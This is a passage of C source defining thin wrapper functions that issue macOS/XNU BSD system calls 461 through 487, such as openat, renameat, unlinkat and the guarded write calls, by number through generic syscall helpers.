  return scc_syscall5((uint64_t)dirfd, (uint64_t)alist, (uint64_t)attributeBuffer, (uint64_t)bufferSize, (uint64_t)options, POSIX_CALL_NUM(461));
}

static return_t scc_openat(int fd, user_addr_t path, int flags, int mode) {
  return scc_syscall4((uint64_t)fd, (uint64_t)path, (uint64_t)flags, (uint64_t)mode, POSIX_CALL_NUM(463));
}


static return_t scc_openat_nocancel(int fd, user_addr_t path, int flags, int mode) {
  return scc_syscall4((uint64_t)fd, (uint64_t)path, (uint64_t)flags, (uint64_t)mode, POSIX_CALL_NUM(464));
}


static return_t scc_renameat(int fromfd, char *from, int tofd, char *to) {
  return scc_syscall4((uint64_t)fromfd, (uint64_t)from, (uint64_t)tofd, (uint64_t)to, POSIX_CALL_NUM(465));
}


static return_t scc_faccessat(int fd, user_addr_t path, int amode, int flag) {
  return scc_syscall4((uint64_t)fd, (uint64_t)path, (uint64_t)amode, (uint64_t)flag, POSIX_CALL_NUM(466));
}


static return_t scc_fchmodat(int fd, user_addr_t path, int mode, int flag) {
  return scc_syscall4((uint64_t)fd, (uint64_t)path, (uint64_t)mode, (uint64_t)flag, POSIX_CALL_NUM(467));
}


static return_t scc_fchownat(int fd, user_addr_t path, uid_t uid,gid_t gid, int flag) {
  return scc_syscall5((uint64_t)fd, (uint64_t)path, (uint64_t)uid, (uint64_t)gid, (uint64_t)flag, POSIX_CALL_NUM(468));
}


static return_t scc_fstatat(int fd, user_addr_t path, user_addr_t ub, int flag) {
  return scc_syscall4((uint64_t)fd, (uint64_t)path, (uint64_t)ub, (uint64_t)flag, POSIX_CALL_NUM(469));
}


static return_t scc_fstatat64(int fd, user_addr_t path, user_addr_t ub, int flag) {
  return scc_syscall4((uint64_t)fd, (uint64_t)path, (uint64_t)ub, (uint64_t)flag, POSIX_CALL_NUM(470));
}


static return_t scc_linkat(int fd1, user_addr_t path, int fd2, user_addr_t link, int flag) {
  return scc_syscall5((uint64_t)fd1, (uint64_t)path, (uint64_t)fd2, (uint64_t)link, (uint64_t)flag, POSIX_CALL_NUM(471));
}


static return_t scc_unlinkat(int fd, user_addr_t path, int flag) {
  return scc_syscall3((uint64_t)fd, (uint64_t)path, (uint64_t)flag, POSIX_CALL_NUM(472));
}


static return_t scc_readlinkat(int fd, user_addr_t path, user_addr_t buf, size_t bufsize) {
  return scc_syscall4((uint64_t)fd, (uint64_t)path, (uint64_t)buf, (uint64_t)bufsize, POSIX_CALL_NUM(473));
}


static return_t scc_symlinkat(user_addr_t *path1, int fd, user_addr_t path2) {
  return scc_syscall3((uint64_t)path1, (uint64_t)fd, (uint64_t)path2, POSIX_CALL_NUM(474));
}


static return_t scc_mkdirat(int fd, user_addr_t path, int mode) {
  return scc_syscall3((uint64_t)fd, (uint64_t)path, (uint64_t)mode, POSIX_CALL_NUM(475));
}


static return_t scc_getattrlistat(int fd, const char *path, struct attrlist *alist, void *attributeBuffer, size_t bufferSize, u_long options) {
  return scc_syscall6((uint64_t)fd, (uint64_t)path, (uint64_t)alist, (uint64_t)attributeBuffer, (uint64_t)bufferSize, (uint64_t)options, POSIX_CALL_NUM(476));
}


static return_t scc_proc_trace_log(pid_t pid, uint64_t uniqueid) {
  return scc_syscall2((uint64_t)pid, (uint64_t)uniqueid, POSIX_CALL_NUM(477));
}


static return_t scc_bsdthread_ctl(user_addr_t cmd, user_addr_t arg1, user_addr_t arg2, user_addr_t arg3) {
  return scc_syscall4((uint64_t)cmd, (uint64_t)arg1, (uint64_t)arg2, (uint64_t)arg3, POSIX_CALL_NUM(478));
}


static return_t scc_openbyid_np(user_addr_t fsid, user_addr_t objid, int oflags) {
  return scc_syscall3((uint64_t)fsid, (uint64_t)objid, (uint64_t)oflags, POSIX_CALL_NUM(479));
}


static return_t scc_recvmsg_x(int s, struct msghdr_x *msgp, u_int cnt, int flags) {
  return scc_syscall4((uint64_t)s, (uint64_t)msgp, (uint64_t)cnt, (uint64_t)flags, POSIX_CALL_NUM(480));
}


static return_t scc_sendmsg_x(int s, struct msghdr_x *msgp, u_int cnt, int flags) {
  return scc_syscall4((uint64_t)s, (uint64_t)msgp, (uint64_t)cnt, (uint64_t)flags, POSIX_CALL_NUM(481));
}


static return_t scc_thread_selfusage(void) {
  return scc_syscall0(POSIX_CALL_NUM(482));
}

static return_t scc_guarded_open_dprotected_np(const char *path, const guardid_t *guard, u_int guardflags, int flags, int dpclass, int dpflags, int mode) {
  return scc_syscall7((uint64_t)path, (uint64_t)guard, (uint64_t)guardflags, (uint64_t)flags, (uint64_t)dpclass, (uint64_t)dpflags, (uint64_t)mode, POSIX_CALL_NUM(484));
}


static return_t scc_guarded_write_np(int fd, const guardid_t *guard, user_addr_t cbuf, user_size_t nbyte) {
  return scc_syscall4((uint64_t)fd, (uint64_t)guard, (uint64_t)cbuf, (uint64_t)nbyte, POSIX_CALL_NUM(485));
}


static return_t scc_guarded_pwrite_np(int fd, const guardid_t *guard, user_addr_t buf, user_size_t nbyte, off_t offset) {
  return scc_syscall5((uint64_t)fd, (uint64_t)guard, (uint64_t)buf, (uint64_t)nbyte, (uint64_t)offset, POSIX_CALL_NUM(486));
}


static return_t scc_guarded_writev_np(int fd, const guardid_t *guard, struct iovec *iovp, u_int iovcnt) {
  return scc_syscall4((uint64_t)fd, (uint64_t)guard, (uint64_t)iovp, (uint64_t)iovcnt, POSIX_CALL_NUM(487));
}

